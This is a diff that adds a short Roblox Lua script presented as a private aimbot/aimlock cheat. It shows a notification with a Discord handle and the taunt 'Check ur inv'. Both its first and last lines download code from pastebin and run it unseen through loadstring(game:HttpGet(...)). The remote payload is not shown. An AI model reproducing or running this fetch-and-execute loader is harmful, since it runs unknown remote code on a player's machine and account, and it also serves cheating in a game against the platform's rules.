@@ -1,0 +1,9 @@
+local SamsNotif = loadstring(game:HttpGet("https://pastebin.com/raw/zz0v0NvR"))();
+local Notify = SamsNotif.Notify;
+Notify({
+Description = "Samuel's Private Aimlock/Aimbot Script";
+Title = "reverofnsa on discord (Hope u happy, Nathan) Btw Check ur inv";
+Duration = 15;
+});
+
+loadstring(game:HttpGet("https://pastebin.com/raw/U3VCeePj"))();
